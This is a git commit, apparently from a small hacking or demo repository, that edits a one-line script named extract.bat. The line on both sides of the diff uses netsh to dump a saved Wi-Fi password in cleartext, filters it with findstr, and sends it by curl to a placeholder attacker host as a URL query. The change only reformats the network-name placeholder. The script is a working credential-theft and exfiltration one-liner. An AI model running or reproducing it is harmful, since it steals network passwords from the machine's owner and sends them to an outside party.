5dfb4ff19a0940e6dae135d358e9b89a96a2948f
ljamel <djamallamri@yahoo.fr>
2024-03-05 14:54:09 +0100

    Update extract.bat

--- extract.bat
+++ extract.bat
@@ -1,1 +1,1 @@
-$wif = (netsh wlan show profile name= "<name-wifi>" key=clear | findstr Contenue*) ; curl <<http://attackerdotcom/>>?$wif
+$wif = (netsh wlan show profile name= "<<name-wifi>>" key=clear | findstr Contenue*) ; curl <<http://attackerdotcom/>>?$wif
